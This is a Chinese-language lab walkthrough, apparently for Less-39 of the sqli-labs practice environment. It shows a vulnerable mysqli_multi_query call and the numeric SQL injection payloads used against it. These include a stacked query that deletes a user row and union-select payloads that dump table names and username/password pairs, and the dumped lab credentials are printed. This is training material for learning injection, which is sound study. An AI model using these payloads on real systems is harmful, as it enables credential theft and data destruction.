---
title: less39
url: https://www.yuque.com/u29002979/ep2zrx/zf0xrhdes1enqu02
---

```bash
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
/* execute multi query */
if (mysqli_multi_query($con1, $sql))
```

注入方式为**数字型注入**，依旧存在**堆叠注入**  。

<a name="s6XR3"></a>

# 堆叠注入

利用堆叠注入,**删除**上一关卡我们增添的数据&#x20;
`?id=1;**delete** from users where username='duidie'--+`

查询看是否存在 发现'duidie'这条数据的账户和密码都没有了 &#x20;
`?id=-1 union select 1,2,(select group_concat(username,0x7e,password)from users)--+`

> Your Username is : 2
> Your Password is : Dumb~Dumb,Angelina~I-kill-you,Dummy~p@ssword,secure~crappy,stupid~stupidity,superman~genious,batman~mob!le,admin~1234,admin1~admin1,admin2~admin2,admin3~admin3,dhakkan~dumbo,admin4~admin4,admin'-- +~123456

<a name="bzYh1"></a>

# 注入点测试

`?id=1'`

> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1

数字型注入。

<a name="PF74E"></a>

# 联合查询

```bash
判断字段数 
?id=1 order by 4--+ 
?id=1 order by 3--+

找回显点
?id=-1 union select 1,2,3--+  

爆破数据库名称
?id=-1 union select 1,2,database()--+

爆破数据库表名称
?id=-1 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+

爆破字段名称
?id=-1 union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users'--+

爆破字段内容
?id=-1 union select 1,2,(select group_concat(username,0x7e,password) from users)--+
```
